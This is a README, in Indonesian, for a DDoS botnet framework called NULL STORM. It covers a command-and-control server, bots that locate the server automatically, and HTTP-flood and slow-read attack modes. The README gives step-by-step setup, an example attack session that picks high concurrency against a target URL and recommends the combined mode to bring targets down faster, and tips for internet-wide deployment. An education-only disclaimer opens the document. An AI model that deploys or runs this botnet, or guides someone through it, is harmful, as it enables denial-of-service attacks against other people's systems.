<p align="center">
  <img src="https://readme-typing-svg.herokuapp.com?font=monospace&size=26&duration=2500&color=FF0000&center=true&vCenter=true&width=500&lines=%E2%98%A0+NULL+STORM+v2.1+%E2%98%A0;Zero+Config+Botnet" alt="NULL STORM">
</p>

<p align="center">
  <img src="https://img.shields.io/badge/Version-2.1-red?style=flat-square">
  <img src="https://img.shields.io/badge/Author-null7-red?style=flat-square">
  <img src="https://img.shields.io/badge/Python-3.8%2B-darkred?style=flat-square">
  <img src="https://img.shields.io/badge/License-MIT-red?style=flat-square">
</p>

---

## ⚠️ DISCLAIMER

> **Tools ini hanya untuk edukasi dan pengujian keamanan sistem sendiri.**
> **Penulis tidak bertanggung jawab atas penyalahgunaan.**
> **Gunakan dengan izin tertulis dari pemilik sistem.**

---

## 🔴 PREVIEW

<p align="center">
  <img src="https://raw.githubusercontent.com/thisnull7/nullbotnet/refs/heads/main/c2.png" alt="NULL STORM C2 Preview" width="700">
</p>

---

## 🔴 OVERVIEW

**NULL STORM** adalah botnet framework dengan sistem auto-discovery. Bot otomatis menemukan C2 server tanpa perlu konfigurasi IP manual. Dilengkapi dua vektor serangan yang dapat digabungkan.

### Fitur Utama

| Fitur | Deskripsi |
|-------|-----------|
| 🔴 Auto-Discovery | Bot cari C2 otomatis via UDP Broadcast |
| 🔴 Zero Config | Bot tinggal copy dan run, tidak perlu edit apapun |
| 🔴 Dual Vector | ApocalypseFlood + SlowRead attack |
| 🔴 High Concurrency | 2000+ koneksi paralel per bot |
| 🔴 Multi Platform | Windows, Linux, macOS, Termux |

---

## 📁 STRUKTUR FOLDER
NULL_STORM/
├── null_c2.py # C2 Command & Control Server
├── null_bot.py # Bot Client
├── config.py # Konfigurasi
├── banner.py # Tampilan Banner
├── attack_modules/
│ ├── init.py
│ ├── apocalypse_flood.py # HTTP Flood Attack
│ └── slow_read.py # Slow Read Attack


---

## 📥 INSTALLASI

### 1. Clone Repository

```bash
git clone https://github.com/thisnull7/nullbotnet.git
cd nullbotnet
pip install aiohttp

🚀 CARA MENJALANKAN
Step 1 — Jalankan C2 Server

Di mesin utama, buka terminal:
bash

python null_c2.py

Step 2 — Jalankan Bot

Di setiap mesin bot (VPS, PC lain, Termux), buka terminal:

python null_bot.py

Bot otomatis menemukan C2. Tidak perlu edit IP.

Step 3 — Cek Bot Online

Di panel C2, ketik:
list

Step 4 — Serang Target

Masukkan URL target:
text

Enter target URL (http:// or https://): https://target.com

Select attack mode:
1. APOCALYPSE (HTTP flood)
2. SLOWREAD  (Slow read)
3. COMBINED   (Both)

Mode (1/2/3): 3

Apocalypse concurrency (default 2000): 5000
Duration seconds (default 120): 300
SlowRead port (default 80): 443
SlowRead connections (default 1000): 3000

🎮 PERINTAH C2
Perintah	Fungsi
list	Lihat bot online
help	Bantuan perintah
banner	Tampilkan banner
exit	Matikan C2
<url>	Serang target
💥 MODE SERANGAN
Mode 1 — APOCALYPSE FLOOD

HTTP/HTTPS flood dengan random user-agent, range header abuse, GET/POST paralel.
Mode 2 — SLOW READ

Membuka ribuan socket, membaca response 1 byte per 30 detik, menghabiskan pool koneksi server.
Mode 3 — COMBINED (Direkomendasikan)

Kedua mode dijalankan bersamaan. Target down lebih cepat.
🌐 DEPLOYMENT
Local Network (LAN)

Semua bot dalam satu jaringan. Auto-discovery via UDP broadcast. Tidak perlu domain.
Internet (WAN)

    Setup domain DuckDNS gratis di https://duckdns.org
